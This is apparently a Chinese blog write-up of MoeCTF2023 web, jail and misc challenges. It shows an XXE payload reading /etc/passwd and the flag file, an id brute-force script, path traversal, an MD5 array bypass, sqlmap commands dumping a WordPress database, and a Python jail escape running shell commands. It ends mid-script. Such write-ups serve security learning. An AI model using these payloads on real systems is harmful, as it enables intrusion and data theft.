          <a href="#了解你的座驾" class="heading-link"><i class="fas fa-link"></i></a><a href="#了解你的座驾" class="headerlink" title="了解你的座驾"></a>了解你的座驾</h2>
      <p>进来之后是一个界面<br><img src="/2023/08/18/MoeCTF2023/13.png"><br>此时后台源码和前端代码翻了翻没有看到啥有用的，此时我们可以看到flag藏在根目录下面，我们应该想办法将其读取出来，原本想要利用伪协议进行读取，但是此时并没有发现参数，那么我们可以抓包进行查看看看<br><img src="/2023/08/18/MoeCTF2023/14.png"><br>此时发现了xml格式的内容，那么此时我们可以尝试XXE外部实体注入利用伪协议来获取flag</p>

        <h3 id="poc">
          <a href="#poc" class="heading-link"><i class="fas fa-link"></i></a><a href="#poc" class="headerlink" title="poc"></a>poc</h3>
      <figure class="highlight xml"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [<span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">xml</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">xml</span>&gt;</span></span><br></pre></td></tr></table></div></figure>
<p>此时发现有回显<br><img src="/2023/08/18/MoeCTF2023/15.png"></p>

        <h3 id="payload">
          <a href="#payload" class="heading-link"><i class="fas fa-link"></i></a><a href="#payload" class="headerlink" title="payload"></a>payload</h3>
      <figure class="highlight xml"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [<span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">xml</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">xml</span>&gt;</span></span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/08/18/MoeCTF2023/16.png"></p>

        <h2 id="大海捞针">
          <a href="#大海捞针" class="heading-link"><i class="fas fa-link"></i></a><a href="#大海捞针" class="headerlink" title="大海捞针"></a>大海捞针</h2>
      <p>此时进去之后是通过get提交参数，然后跟上面的彼岸的flag一样都是给出聊天记录让你去找flag,但是此题却有1000个，那么此时我们可以让chatgpt写一个脚本，此脚本的功能是通过程序一个个的去访问id的值，然后在html中寻找包含<code>moectf&#123;</code>的内容并且返回给我们<br>考虑到一个个的来速度过于慢，那么此时我们就可以让chatgpt加入多线程进行爆破提升效率</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&#x27;http://localhost:33216/?id=&#x27;</span></span><br><span class="line">keyword = <span class="string">&#x27;moectf&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">fetch_url</span>(<span class="params">session, i</span>):</span><br><span class="line">    url = <span class="string">f&#x27;<span class="subst">&#123;base_url&#125;</span><span class="subst">&#123;i&#125;</span>&#x27;</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> response:</span><br><span class="line">        text = <span class="keyword">await</span> response.text()</span><br><span class="line">        <span class="keyword">if</span> keyword <span class="keyword">in</span> text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Found keyword &quot;<span class="subst">&#123;keyword&#125;</span>&quot; in <span class="subst">&#123;url&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">        tasks = [fetch_url(session, i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1001</span>)]</span><br><span class="line">        <span class="keyword">await</span> asyncio.gather(*tasks)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    asyncio.run(main())</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/08/18/MoeCTF2023/17.png"><br>此时已经成功爆破出来了我们直接访问 <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://101.42.178.83:7770/?id=945">http://101.42.178.83:7770/?id=945</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 的源码然后搜索即可获取flag<br><img src="/2023/08/18/MoeCTF2023/18.png"></p>

        <h2 id="meo的图床">
          <a href="#meo的图床" class="heading-link"><i class="fas fa-link"></i></a><a href="#meo的图床" class="headerlink" title="meo的图床"></a>meo的图床</h2>
      <p>此时依旧是和上面一样的文件上传界面，此时我们可以修改请求包的文件名后缀来绕过png检测，但是此时我们发现我们传上去的马儿连接不了，那么此时我们再次传递一个phpinfo的文件看看是啥情况<br><img src="/2023/08/18/MoeCTF2023/19.png"><br>此时我们可以发现我们的马儿应该是被解析成了图片导致无法生效；此时我扫描了一下网站后台依旧是没有存在后台泄露，那么此时我们将我们的注意力放到url上面<br><code>http://localhost:36151/images.php?name=64dfb129d333f_phpinfo.php</code><br>此时发现了是通过get来访问的并且带有参数，那么此时我们就可以尝试伪协议来读取，但是很可惜伪协议无法生效，但是因为可以读取我们上传的文件，那么此时我们就可以尝试目录穿越来读取文件<br>此时发现目录穿越成功我们来访问这个文件<br><img src="/2023/08/18/MoeCTF2023/20.png"></p>

        <h3 id="代码审计">
          <a href="#代码审计" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$param1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;param1&#x27;</span>];</span><br><span class="line">    <span class="variable">$param2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$param1</span> !== <span class="variable">$param2</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$md5Param1</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$param1</span>);</span><br><span class="line">        <span class="variable">$md5Param2</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$param2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$md5Param1</span> == <span class="variable">$md5Param2</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;O.O!! &quot;</span> . <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;O.o??&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;o.O?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;O.o?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> O.o?</span><br></pre></td></tr></table></div></figure>
<p>此时发现让我们通过get的方式提交两个参数，这两个参数的值不能相等，但是其md5的若比较要相等，那么此时我门可以尝试数组绕过</p>

        <h3 id="MD5弱比较绕过">
          <a href="#MD5弱比较绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#MD5弱比较绕过" class="headerlink" title="MD5弱比较绕过"></a>MD5弱比较绕过</h3>
      <p><img src="/2023/08/18/MoeCTF2023/21.png"></p>

        <h2 id="心海的小屋">
          <a href="#心海的小屋" class="heading-link"><i class="fas fa-link"></i></a><a href="#心海的小屋" class="headerlink" title="心海的小屋"></a>心海的小屋</h2>
      
        <h3 id="信息收集">
          <a href="#信息收集" class="heading-link"><i class="fas fa-link"></i></a><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3>
      <p>此时我们看到这个wordpress框架时我们第一个想法便是使用WPscan进行扫描漏洞然后在进行漏洞利用，可是在我们扫描之后发现没有任何的漏洞可以利用，那么此时我们就应该想想是否有啥后台可以被我们发现；此时我们成功的在请求头中发现我们以POST的形式向<code>http://101.42.178.83:7770/word press/wp-content/plugins/visitor-logging/logger.php</code>请求过地址<br><img src="/2023/08/18/MoeCTF2023/62.png"></p>

        <h3 id="源码审计">
          <a href="#源码审计" class="heading-link"><i class="fas fa-link"></i></a><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h3>
      <p>此时我们访问<code>http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php</code>发现存在源码</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Plugin Name: Visitor auto recorder</span></span><br><span class="line"><span class="comment">Description: Automatically record visitor&#x27;s identification, still in development, do not use in industry environment!</span></span><br><span class="line"><span class="comment">Author: KoKoMi</span></span><br><span class="line"><span class="comment">  Still in development! :)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不许偷看！这些代码我还在调试呢！</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载数据库配置，暂时用硬编码绝对路径</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;/var/www/html/wordpress/&#x27;</span> . <span class="string">&#x27;wp-config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$db_user</span> = DB_USER; <span class="comment">// 数据库用户名</span></span><br><span class="line"><span class="variable">$db_password</span> = DB_PASSWORD; <span class="comment">// 数据库密码</span></span><br><span class="line"><span class="variable">$db_name</span> = DB_NAME; <span class="comment">// 数据库名称</span></span><br><span class="line"><span class="variable">$db_host</span> = DB_HOST; <span class="comment">// 数据库主机</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 我记得可以用wp提供的global $wpdb来操作数据库，等旅游回来再研究一下</span></span><br><span class="line"><span class="comment">// 这些是临时的代码</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="variable">$user_agent</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user_agent&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;time&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$mysqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$db_host</span>, <span class="variable">$db_user</span>, <span class="variable">$db_password</span>, <span class="variable">$db_name</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;connect_errno) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;数据库连接失败: &#x27;</span> . <span class="variable">$mysqli</span>-&gt;connect_error;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;INSERT INTO visitor_records (ip, user_agent, time) VALUES (&#x27;<span class="subst">$ip</span>&#x27;, &#x27;<span class="subst">$user_agent</span>&#x27;, <span class="subst">$time</span>)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行插入</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$mysqli</span>, <span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查插入是否成功</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;数据插入成功&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;数据插入失败: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$mysqli</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭数据库连接</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$mysqli</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//gpt真好用</span></span><br><span class="line">数据插入失败: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version <span class="keyword">for</span> the right syntax to <span class="keyword">use</span> <span class="title">near</span> &#x27;)&#x27; <span class="title">at</span> <span class="title">line</span> 1</span><br></pre></td></tr></table></div></figure>
<p>此时发现存在<code>$ip = $_POST[&#39;ip&#39;];$user_agent = $_POST[&#39;user_agent&#39;];$time = stripslashes($_POST[&#39;time&#39;]);</code>;那么此时我们可以怀疑<br>存在sql注入，并且从下方的报错中可以怀疑是报错注入；此时我们直接使用自动化工具<code>sqlmap</code>测一下</p>

        <h3 id="爆库">
          <a href="#爆库" class="heading-link"><i class="fas fa-link"></i></a><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r D:\桌面\MoeCTF2023\web\moectf.txt --dbs</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/08/18/MoeCTF2023/63.png"></p>

        <h3 id="爆表">
          <a href="#爆表" class="heading-link"><i class="fas fa-link"></i></a><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r D:\桌面\MoeCTF2023\web\moectf.txt -D wordpress --tables</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/08/18/MoeCTF2023/64.png"></p>

        <h3 id="爆列">
          <a href="#爆列" class="heading-link"><i class="fas fa-link"></i></a><a href="#爆列" class="headerlink" title="爆列"></a>爆列</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r D:\桌面\MoeCTF2023\web\moectf.txt -D wordpress -T secret_of_kokomi --columns</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/08/18/MoeCTF2023/65.png"></p>

        <h3 id="爆数据">
          <a href="#爆数据" class="heading-link"><i class="fas fa-link"></i></a><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r D:\桌面\MoeCTF2023\web\moectf.txt -D wordpress -T secret_of_kokomi -C content</span><br><span class="line">--dump</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/08/18/MoeCTF2023/66.png"></p>

        <h1 id="Jail">
          <a href="#Jail" class="heading-link"><i class="fas fa-link"></i></a><a href="#Jail" class="headerlink" title="Jail"></a>Jail</h1>
      
        <h2 id="Jail-Level-0">
          <a href="#Jail-Level-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#Jail-Level-0" class="headerlink" title="Jail Level 0"></a>Jail Level 0</h2>
      <p>此时查看tips可以看到显示说<code>eval</code>可以使用<br><img src="/2023/08/18/MoeCTF2023/58.png"></p>

        <h3 id="payload-1">
          <a href="#payload-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;)</span><br><span class="line">eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;cat flag&#x27;)&quot;)</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/08/18/MoeCTF2023/57.png"></p>

        <h1 id="MISC">
          <a href="#MISC" class="heading-link"><i class="fas fa-link"></i></a><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1>
      
        <h2 id="Misc-入门指北">
          <a href="#Misc-入门指北" class="heading-link"><i class="fas fa-link"></i></a><a href="#Misc-入门指北" class="headerlink" title="Misc 入门指北"></a>Misc 入门指北</h2>
      <p><img src="/2023/08/18/MoeCTF2023/22.png"></p>

        <h2 id="打不开的图片1">
          <a href="#打不开的图片1" class="heading-link"><i class="fas fa-link"></i></a><a href="#打不开的图片1" class="headerlink" title="打不开的图片1"></a>打不开的图片1</h2>
      <p>此时使用010打开之后发现是jpg格式的图片<br><img src="/2023/08/18/MoeCTF2023/23.png"><br> 然后发现少了jpg格式的文件头<code>FFD8FF</code>,此时我们将其补上；然后打开详细信息观察到一个十六进制编码，此时我们直接十六进制转ascii<br><img src="/2023/08/18/MoeCTF2023/24.png"></p>

        <h2 id="打不开的图片2">
          <a href="#打不开的图片2" class="heading-link"><i class="fas fa-link"></i></a><a href="#打不开的图片2" class="headerlink" title="打不开的图片2"></a>打不开的图片2</h2>
      <p>此时使用010打开之后发现是png格式的图片<br><img src="/2023/08/18/MoeCTF2023/25.png"><br>此时发现其文件头不为<code>89504E47</code>;更改之后打开即可看到flag<br><img src="/2023/08/18/MoeCTF2023/26.png"></p>

        <h2 id="building-near-lake">
          <a href="#building-near-lake" class="heading-link"><i class="fas fa-link"></i></a><a href="#building-near-lake" class="headerlink" title="building_near_lake"></a>building_near_lake</h2>
      <p><img src="/2023/08/18/MoeCTF2023/1.jpg"><br>此时直接拖入百度识图就识别出这个是厦门大学的翔安校区的图书馆<br><img src="/2023/08/18/MoeCTF2023/31.png"></p>

        <h2 id="奇怪的压缩包">
          <a href="#奇怪的压缩包" class="heading-link"><i class="fas fa-link"></i></a><a href="#奇怪的压缩包" class="headerlink" title="奇怪的压缩包"></a>奇怪的压缩包</h2>
      <p>此时打开之后发现是ppt的配置文件<br><img src="/2023/08/18/MoeCTF2023/32.png"><br>此时我们只需要将.zip改成.ppt即可<br>此时涉及到ppt的隐写，此时一般就是字体颜色的隐藏和ppt的隐藏，我们可以直接全选把字体改成鲜艳一点即可<br><img src="/2023/08/18/MoeCTF2023/33.png"><br>后面的flag是藏在图片后面和在大纲里面，移动掉图片即可和展开大纲即可</p>

        <h2 id="烫烫烫">
          <a href="#烫烫烫" class="heading-link"><i class="fas fa-link"></i></a><a href="#烫烫烫" class="headerlink" title="烫烫烫"></a>烫烫烫</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+j9k-+Zi8-+T2A-+doQ-flag+/xo-+AAo-+AAo-a9736d8ad21107398b73324694cbcd11f66e3befe67016def21dcaa9ab143bc4405be596245361f98db6a0047b4be78ede40864eb988d8a4999cdcb31592fd42c7b73df3b492403c9a379a9ff5e81262+AAo-+AAo-+T0Y-+Zi8-flag+dSg-AES+UqA-+W8Y-+ToY-+/ww-key+Zi8-+Tgs-+l2I-+j9k-+iEw-+W1c-+doQ-sha256+/wg-hash+UDw-+doQ-+XwA-+WTQ-+Zi8-b34edc782d68fda34dc23329+/wk-+AAo-+AAo-+YkA-+TuU-+i/Q-+/ww-codepage+dx8-+doQ-+X4g-+kc0-+iYE-+VUo-+/wg-+AAo</span><br></pre></td></tr></table></div></figure>
<p>直接尝试一键解码试试看，发现是UTF-7的编码<br><img src="/2023/08/18/MoeCTF2023/34.png"><br>接下来是AES解码<br><img src="/2023/08/18/MoeCTF2023/35.png"></p>

        <h2 id="你想要flag吗">
          <a href="#你想要flag吗" class="heading-link"><i class="fas fa-link"></i></a><a href="#你想要flag吗" class="headerlink" title="你想要flag吗"></a>你想要flag吗</h2>
      <p>此时下来之后发现是一段wav音频此时我们使用Au工具打开之后发现了key和passwd<br><img src="/2023/08/18/MoeCTF2023/59.png"><br>此时首先考虑的就是DeepSound和SilentEye但是很可惜并没有发现东西；这个时候我们可以一个一个的音频隐写工具试过去；最后发现是Steghide<br><img src="/2023/08/18/MoeCTF2023/60.png"><br>然后此时我们看到这个文档的名字叫做兔兔就可以尝试一下兔子密码<br><img src="/2023/08/18/MoeCTF2023/61.png"></p>

        <h2 id="狗子-1-普通的猫">
          <a href="#狗子-1-普通的猫" class="heading-link"><i class="fas fa-link"></i></a><a href="#狗子-1-普通的猫" class="headerlink" title="狗子(1) 普通的猫"></a>狗子(1) 普通的猫</h2>
      <p><img src="/2023/08/18/MoeCTF2023/27.png"></p>

        <h2 id="狗子-2-照片">
          <a href="#狗子-2-照片" class="heading-link"><i class="fas fa-link"></i></a><a href="#狗子-2-照片" class="headerlink" title="狗子(2) 照片"></a>狗子(2) 照片</h2>
      <p>此时打开之后是一张png照片，此时通过常规的查找并没有发现信息泄露，考虑到是png的隐写，此时我们可以尝试一下看看是不是LSB的隐写<br>此时使用StegSolve打开之后在每个通道的第0像素位都发现了存在东西<br><img src="/2023/08/18/MoeCTF2023/28.png"><br>但是此时却发现StegSlove无法成功提取，我们考虑换一个可以提取LSB隐写的工具CyberChef<br><img src="/2023/08/18/MoeCTF2023/29.png"></p>

        <h2 id="狗子-3-寝室">
          <a href="#狗子-3-寝室" class="heading-link"><i class="fas fa-link"></i></a><a href="#狗子-3-寝室" class="headerlink" title="狗子(3) 寝室"></a>狗子(3) 寝室</h2>
      <p>此时下载下来之后发现是一个套娃(套了一万次哇)的压缩包，并且存在不同种类的压缩包，此时我们可以考虑写一个脚本帮我们自动解压;这里建议解压完<br>一个就删除上一个(不然电脑硬盘会变红，别问我为啥知道)</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> py7zr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_archive</span>(<span class="params">archive_filename, output_dir</span>):</span><br><span class="line">    <span class="keyword">if</span> archive_filename.endswith(<span class="string">&#x27;.tar&#x27;</span>):</span><br><span class="line">        <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(archive_filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> tar_ref:</span><br><span class="line">            tar_ref.extractall(output_dir)</span><br><span class="line">    <span class="keyword">elif</span> archive_filename.endswith(<span class="string">&#x27;.tar.gz&#x27;</span>) <span class="keyword">or</span> archive_filename.endswith(<span class="string">&#x27;.tgz&#x27;</span>):</span><br><span class="line">        <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(archive_filename, <span class="string">&#x27;r:gz&#x27;</span>) <span class="keyword">as</span> tar_ref:</span><br><span class="line">            tar_ref.extractall(output_dir)</span><br><span class="line">    <span class="keyword">elif</span> archive_filename.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(archive_filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">            zip_ref.extractall(output_dir)</span><br><span class="line">    <span class="keyword">elif</span> archive_filename.endswith(<span class="string">&#x27;.7z&#x27;</span>):</span><br><span class="line">        <span class="keyword">with</span> py7zr.SevenZipFile(archive_filename, mode=<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> seven_zip_ref:</span><br><span class="line">            seven_zip_ref.extractall(output_dir)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_previous_archive</span>(<span class="params">archive_filename</span>):</span><br><span class="line">    os.remove(archive_filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    source_archive = <span class="string">&quot;F:/寝室/shell96.tar.gz&quot;</span>  <span class="comment"># 替换为实际的源套娃压缩包路径</span></span><br><span class="line">    output_directory = <span class="string">&quot;F:/寝室/&quot;</span>  <span class="comment"># 替换为实际的输出目录路径</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(output_directory):</span><br><span class="line">        os.makedirs(output_directory)</span><br><span class="line"></span><br><span class="line">    previous_archive = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> source_archive:</span><br><span class="line">        extract_archive(source_archive, output_directory)</span><br><span class="line">        <span class="keyword">if</span> previous_archive:</span><br><span class="line">            delete_previous_archive(previous_archive)</span><br><span class="line">        previous_archive = source_archive</span><br><span class="line">        source_archive = 